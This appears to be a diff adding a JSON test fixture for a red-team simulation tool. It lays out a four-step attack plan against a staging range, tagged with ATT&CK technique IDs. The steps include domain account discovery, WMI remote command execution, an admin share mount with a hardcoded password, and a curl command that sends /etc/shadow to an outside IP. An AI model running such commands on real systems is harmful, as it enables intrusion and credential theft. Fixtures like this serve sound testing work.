@@ -1,0 +1,70 @@
+{
+  "plan_id": "redplan-fixture-001",
+  "environment_id": "staging-range",
+  "objective": "Simulate adversary reconnaissance, lateral movement, and exfiltration across staging range",
+  "cycle_number": 1,
+  "steps": [
+    {
+      "step_id": "step-01-recon",
+      "technique_id": "T1087",
+      "name": "Account Discovery",
+      "environment_id": "staging-range",
+      "target_asset": "srv-dc-01.range.corp",
+      "command_or_action": "net user /domain",
+      "prerequisites": [],
+      "cleanup_action": null,
+      "metadata": {
+        "user": "analyst-test"
+      }
+    },
+    {
+      "step_id": "step-02-lateral",
+      "technique_id": "T1047",
+      "name": "WMI Execution",
+      "environment_id": "staging-range",
+      "target_asset": "srv-app-02.range.corp",
+      "command_or_action": "wmic /node:srv-app-02 process call create 'cmd.exe /c whoami'",
+      "prerequisites": [
+        "step-01-recon"
+      ],
+      "cleanup_action": null,
+      "metadata": {
+        "privilege": "elevated"
+      }
+    },
+    {
+      "step_id": "step-03-anomaly",
+      "technique_id": "T1021.002",
+      "name": "SMB Admin Share Access",
+      "environment_id": "staging-range",
+      "target_asset": "srv-db-01.range.corp",
+      "command_or_action": "net use \\srv-db-01\\C$ /u:corp\u0007dmin Secret123",
+      "prerequisites": [
+        "step-02-lateral"
+      ],
+      "cleanup_action": "net use \\srv-db-01\\C$ /delete",
+      "metadata": {
+        "stealth": true
+      }
+    },
+    {
+      "step_id": "step-04-exfil",
+      "technique_id": "T1048",
+      "name": "Alternative Protocol Exfiltration",
+      "environment_id": "staging-range",
+      "target_asset": "srv-exfil-01.range.corp",
+      "command_or_action": "curl --data-binary @/etc/shadow http://198.51.100.22/collect",
+      "prerequisites": [
+        "step-03-anomaly"
+      ],
+      "cleanup_action": null,
+      "metadata": {
+        "stealth": true
+      }
+    }
+  ],
+  "metadata": {
+    "source": "recorded_fixture",
+    "version": "1.0"
+  }
+}
